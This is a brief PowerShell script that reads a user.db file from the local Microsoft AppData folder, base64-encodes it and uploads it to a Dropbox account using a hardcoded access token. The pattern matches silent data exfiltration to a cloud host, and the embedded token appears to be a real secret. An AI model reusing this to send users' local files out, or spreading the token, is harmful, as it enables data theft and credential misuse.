# Set your access token
$accessToken = "sl.BbvpwMyj6IYvbj8pWYOV3DUlhHt8eoly-t1T2KxtrzYy5da5rR6Yo2Vwraw6RGDBQ59yXNTKhhxZifXN4vKn0Gq2hE0m_rHBgxzll_Ytqg7y1wFK5Bv-ChfloUQ5m6CCRftMkUE"

# Set the file path and destination path
$filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
$destinationPath = "/user.db"

# Read file content as bytes
$fileContent = Get-Content -Path $filePath -Encoding Byte

# Convert file content to Base64
$fileContentBase64 = [System.Convert]::ToBase64String($fileContent)

# Prepare headers
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    "Content-Type" = "application/octet-stream"
}

# Make the API request
$apiUrl = "https://content.dropboxapi.com/2/files/upload"
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $fileContentBase64

# Print response
Write-Host "File uploaded successfully. Response:" $response
